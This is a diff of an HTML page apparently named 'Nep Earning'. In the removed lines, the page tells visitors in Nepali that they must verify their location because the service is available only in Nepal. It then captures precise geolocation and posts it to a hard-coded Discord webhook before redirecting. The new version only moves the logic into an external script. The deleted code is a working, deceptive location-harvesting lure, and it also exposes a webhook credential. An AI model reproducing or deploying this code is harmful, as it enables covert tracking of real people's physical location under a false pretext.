@@ -1,212 +1,28 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Nep Earning</title>
-<style>
-  /* Background styling */
-  body, html {
-    margin: 0; padding: 0; height: 100%;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background: linear-gradient(135deg, #667eea, #764ba2);
-    color: white;
-    overflow: hidden; /* Prevent scroll while modal active */
-  }
-
-  .site-content {
-    height: 100vh;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    user-select: none;
-  }
-
-  .site-content h1 {
-    font-size: 3rem;
-    margin-bottom: 0.5rem;
-    text-shadow: 0 0 10px rgba(0,0,0,0.4);
-  }
-
-  .site-content p {
-    font-size: 1.2rem;
-    max-width: 600px;
-    text-align: center;
-    text-shadow: 0 0 8px rgba(0,0,0,0.3);
-  }
-
-  /* Modal overlay */
-  #location-modal {
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.85);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 9999;
-  }
-
-  #location-modal .modal-box {
-    background: #2c2c54;
-    border-radius: 12px;
-    padding: 30px 40px;
-    max-width: 400px;
-    width: 90%;
-    box-shadow: 0 0 20px rgba(102, 126, 234, 0.7);
-    text-align: center;
-  }
-
-  #location-modal .modal-box h2 {
-    margin-top: 0;
-    margin-bottom: 20px;
-    font-weight: 700;
-  }
-
-  #location-modal .modal-box p {
-    margin-bottom: 30px;
-    font-size: 1rem;
-    line-height: 1.4;
-    color: #ddd;
-  }
-
-  #location-modal button {
-    background: #667eea;
-    color: white;
-    border: none;
-    padding: 14px 28px;
-    font-size: 1.1rem;
-    font-weight: 600;
-    border-radius: 8px;
-    cursor: pointer;
-    transition: background 0.3s ease;
-    box-shadow: 0 4px 10px rgba(102,126,234,0.6);
-    user-select: none;
-  }
-
-  #location-modal button:hover {
-    background: #5a67d8;
-  }
-
-  #location-modal button:active {
-    transform: scale(0.98);
-  }
-
-  #status {
-    margin-top: 10px;
-    color: #ccc;
-    min-height: 1.2em;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Location Access Required</title>
+  <link rel="stylesheet" href="style.css"/>
 </head>
 <body>
 
-<div class="site-content" aria-hidden="true">
-  <h1>Welcome to Amazing Site</h1>
-  <p>Discover exciting content, latest updates, and exclusive offers tailored just for you.</p>
+<div class="site-content">
+  <h1>Welcome!</h1>
+  <p>Our services are only available in Nepal. Please verify your location to continue.</p>
 </div>
 
-<!-- Modal overlay -->
-<div id="location-modal" role="dialog" aria-modal="true" aria-labelledby="modal-title" aria-describedby="modal-desc">
+<div id="location-modal">
   <div class="modal-box">
-    <h2 id="modal-title">कृपया आफ्नो Location Verify गर्नुहोस्</h2>
-    <p id="modal-desc">
-      हाम्रा सेवा केवल नेपालमा मात्र उपलब्ध छन्, 
-      त्यसैले वेबसाइट प्रयोग गर्न आफ्नो Location Verify गर्नुहोस्।
-    </p>
-    <button id="allow-btn" type="button">Allow Location</button>
-    <p id="status"></p>
+    <h2>कृपया आफ्नो Location Verify गर्नुहोस्</h2>
+    <p>हाम्रा सेवा केवल नेपालमा मात्र उपलब्ध छन्, 
+      त्यसैले वेबसाइट प्रयोग गर्न आफ्नो Location Verify गर्नुहोस्।</p>
+    <button id="allow-btn">Allow Location</button>
+    <p id="status-message"></p>
   </div>
 </div>
 
-<script>
-  const webhookURL = "https://discord.com/api/webhooks/1378033823329026058/HMfzc8nCvvv39-8YX6vipDjEkBvckadQBrtidk4kG4SRrdO5Zdr1Q8bjnckLKt68cb1c"; // Replace this with your webhook URL
-
-  const modal = document.getElementById("location-modal");
-  const allowBtn = document.getElementById("allow-btn");
-  const statusP = document.getElementById("status");
-
-  function sendToDiscord(message) {
-    return fetch(webhookURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: message })
-    });
-  }
-
-  function redirectToTarget() {
-    window.location.href = "https://someonepage.com";
-  }
-
-  allowBtn.addEventListener("click", () => {
-    allowBtn.disabled = true;
-    allowBtn.textContent = "Requesting Location...";
-    statusP.textContent = "Waiting for your location...";
-
-    if (!navigator.geolocation) {
-      statusP.textContent = "Geolocation is not supported by your browser.";
-      sendToDiscord("❌ Location API not supported on user device.").finally(() => {
-        setTimeout(redirectToTarget, 2000);
-      });
-      return;
-    }
-
-    const fallbackTimeout = setTimeout(() => {
-      statusP.textContent = "No response, redirecting...";
-      redirectToTarget();
-    }, 20000); // 20 seconds fallback
-
-    navigator.geolocation.getCurrentPosition(position => {
-      clearTimeout(fallbackTimeout);
-
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      const acc = position.coords.accuracy;
-      const timestamp = new Date().toISOString();
-
-      const msg = `📍 Location Captured:
-Latitude: ${lat}
-Longitude: ${lon}
-Accuracy: ${acc} meters
-Time: ${timestamp}`;
-
-      statusP.textContent = "Location captured, sending data...";
-
-      sendToDiscord(msg)
-        .then(() => {
-          statusP.textContent = "Data sent! Redirecting...";
-          modal.style.display = "none";
-          setTimeout(redirectToTarget, 1500);
-        })
-        .catch(e => {
-          console.error("Failed to send webhook", e);
-          statusP.textContent = "Failed to send data, but redirecting...";
-          modal.style.display = "none";
-          setTimeout(redirectToTarget, 1500);
-        });
-
-    }, error => {
-      clearTimeout(fallbackTimeout);
-
-      const errorMsg = `❌ Location access denied or failed: ${error.message}`;
-      console.warn(errorMsg);
-      statusP.textContent = "Location denied or failed. Redirecting...";
-
-      sendToDiscord(errorMsg)
-        .finally(() => {
-          modal.style.display = "none";
-          setTimeout(redirectToTarget, 1500);
-        });
-    }, {
-      enableHighAccuracy: true,
-      timeout: 15000,
-      maximumAge: 0
-    });
-  });
-
-  // Disable scrolling while modal is active
-  document.body.style.overflow = "hidden";
-</script>
-
+<script src="script.js"></script>
 </body>
 </html>
